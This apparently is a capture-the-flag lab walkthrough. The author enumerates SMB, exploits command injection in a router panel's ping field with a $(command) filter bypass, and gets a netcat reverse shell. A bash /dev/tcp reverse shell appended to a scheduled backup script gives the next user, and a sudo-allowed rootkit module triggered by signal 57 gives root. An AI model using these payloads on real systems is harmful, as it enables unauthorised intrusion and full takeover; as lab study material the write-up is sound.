Seeing that there is port 80, i visited the web page

I searched through but not, so i checked the smb port
```
smbclient -L //ip//
```

```
smbclient //ip/public
```

reading the msg_for_administrator.txt file

## Command Injection

So i visited the /myrouterpanel directory on the web

Seeing this what came to my mind was Command injection

I firstly checked if the ping function was working

Seeing that the ping is working i tried ```127.0.0.1;ls``` ```127.0.0.1| ls``  payload but it did not

After some tries i was able to bypas it with
```
$(command)
```
so in order to get an RCE i used

```
$(nc <lhost> <lport> -e /bin/bash)
```

I tried accessing the /home/athena directory i keep getting Permission denied

## Privilege escalation to athena

```
find / -user 'athena' 2>/dev/null
```

we se a /usr/share/backup directory which has a backup.sh file in it

![Screenshot from 2023-09-19 22-28-12](https://github.com/7h30ry/Writeups/assets/51336409/66c7cc7f-e418-4dc4-801f-63f1ac472904)

Guessing there is process runing the backup.sh file i decided to add a reverse shell inside the backup.sh file

```
echo 'bash -i >& /dev/tcp/<lhost>/4444 0>&1' >> backup.sh
```
start a listener on 4444

After a while i got a reverse shell as athena

## Root

Trying sudo -l

![Screenshot from 2023-09-19 22-34-14](https://github.com/7h30ry/Writeups/assets/51336409/dd87a0a5-3129-4aea-b358-3db14e2b2ca8)

we see that we can run 
```(root) NOPASSWD: /usr/sbin/insmod /mnt/.../secret/venom.ko```

## USE Ghidra: to reverse the venom.ko file

after some reversing, we notice the ```hacked_kill``` function :

![ghidra](https://github.com/7h30ry/Writeups/assets/51336409/15e74320-f334-41f6-a6e0-88ecebf345b2)

we see that in order for give_root() to get called, we need to send a signal 57 instead of 64 as mentioned in the github repository, so this rootkit was slightly modified, let's try again with signal 57 :

the give_root function may work like this kill -57 <pid>, later on the id command reveals that you have root access.

so i started a process with 
```sleep 10 &```

got the process id and typed
```kill -57 -pid```

Now we got Root !!!
